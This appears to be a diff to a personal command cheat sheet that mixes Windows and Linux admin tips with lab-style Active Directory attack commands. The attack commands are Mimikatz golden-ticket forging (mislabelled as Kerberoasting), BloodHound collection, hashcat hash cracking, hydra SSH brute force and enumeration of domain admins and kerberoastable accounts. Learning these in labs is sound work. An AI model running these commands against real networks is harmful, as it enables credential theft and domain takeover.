@@ -7,8 +7,9 @@
 // New Gist Shortcut  
  
  https://gist.github.com  
- 
 
+
+   
 // The Harvester  as Docker container  
 ```  
 docker run --rm -it --mount type=bind,source="$HOME/.theHarvester/api-keys.yaml",target="/app/api-keys.yaml" --entrypoint "/root/.local/bin/theHarvester" theharvester -d linkedin.com -b all
@@ -198,6 +199,11 @@ mimikatz # sekurlsa::credman
 ...
 ```
 
+// Kerberoasting
+```powershell  
+kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500 
+```  
+
 // Performing an AS-REP Roasting Attack against Users List
 ```
 GetNPUsers.py -dc-ip 10.10.117.9 thm.red/ -usersfile /tmp/users.txt
@@ -224,6 +230,12 @@ hashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt
 hashcat -a 0 -m 18200 as-rep.hash /path/to/wordlist
 ```
 
+// Hashcat - Crack the NTLMv2 hash
+
+```bash
+hashcat -a 0 -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
 // Find processes running on a port - Windows  
  
      netstat -ano | findstr <port_number> 
@@ -233,13 +245,14 @@ hashcat -a 0 -m 18200 as-rep.hash /path/to/wordlist
      tasklist /FI "PID eq <process_id>"  
      
 // Get location of process - Windows  
- 
-     wmic process where ProcessId=<process_id> get ExecutablePath
- 
-// List domain users - Windows  
- 
-     net user /domain
- 
+```powershell
+// old way
+wmic process where ProcessId=<process_id> get ExecutablePath
+
+// new way
+Get-Process -Id 11076 | Select-Object -ExpandProperty Path
+```
+
 // Find SMB shares on Windows host - Linux  
  
      smbclient -L <hostname or ip> -U <domain/user>
@@ -284,31 +297,41 @@ hashcat -a 0 -m 18200 as-rep.hash /path/to/wordlist
  
      go mod init foo  
      
-// Set primary and secondary DNS - Windows
+// Set primary and secondary DNS - Windows  
  
      Get-NetAdapter  
      Set-DnsClientServerAddress -InterfaceIndex <Interface Number> -ServerAddresses ("8.8.8.8","8.8.4.4")  
      
 // Join to domain - Windows
  
-     Add-Computer -DomainName <domain name>
+     Add-Computer -DomainName <domain name>  
      
 // Get current domain - Windows
  
      (Get-WmiObject Win32_ComputerSystem).Domain
 
-// Network connections - Windows
- 
-     ncpa.cpl  
+// Bloodhound  
+```powershell  
+Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
+```  
 
-// User Management - Wind0ze  
+// Get descriptions of domain users  
+```powershell   
+Get-ADUser -Filter * -Properties Description | 
+    Select-Object SamAccountName, Description
+```  
 
-     lusrmgr  
-     
-// Advanced Rename / User account removal - Windows
- 
-     sysdm.cpl  
- 
+// Get domain admins  
+```powershell    
+Get-ADGroupMember -Identity "Domain Admins" -Recursive | Select-Object SamAccountName
+```  
+
+// Find Keroastable acounts  
+```powershell  
+Get-ADUser -Filter { ServicePrincipalName -ne "$null" } -Properties ServicePrincipalName | 
+    Select-Object SamAccountName, ServicePrincipalName
+```
+
 // Linux command equivalents - Windows
 
     copy
@@ -340,10 +363,6 @@ hashcat -a 0 -m 18200 as-rep.hash /path/to/wordlist
  
      rm -rf ~/Library/Developer/Xcode/DerivedData/*  
      
-// Firefox for Windows: 
- 
-    curl -L -o firefox-latest.exe "https://download.mozilla.org/?product=firefox-latest-ssl&os=win64&lang=en-US"  
-    
 // Windows key from firmware/BIOS - Linux 
 
     sudo strings /sys/firmware/acpi/tables/MSDM
@@ -427,11 +446,6 @@ hashcat -a 0 -m 18200 as-rep.hash /path/to/wordlist
 
     md5 filename
     shasum -a 256 filename
-
-// Lokinet - Linux
- 
-     sudo curl -so /etc/apt/trusted.gpg.d/oxen.gpg https://deb.oxen.io/pub.gpg  
-     echo "deb https://deb.oxen.io $(lsb_release -sc) main" | sudo tee /etc/apt/sources.list.d/oxen.list 
 
 // Right-Click context menu - Windows 11  
  
@@ -579,7 +593,7 @@ sudo wget -O /usr/share/nmap/scripts/<script-name>.nse https://svn.nmap.org/nmap
 
 // Hydra  
 
- SSH  
+SSH  
 
     hydra -l <username> -P /usr/share/wordlists/rockyou.txt 1<hostname> -t 4 ssh -V  
 
@@ -598,6 +612,8 @@ Web Portal
     tshark -r dns.cap -Y "dns.qry.type == 1" -T fields -e dns.qry.name 
      
 // Links  
+Hashcat-Cheatsheet - frizb/Hashcat-Cheatsheet  
+https://github.com/frizb/Hashcat-Cheatsheet  
 
 TCP/IP RFC 9293  
 https://www.rfc-editor.org/rfc/rfc9293
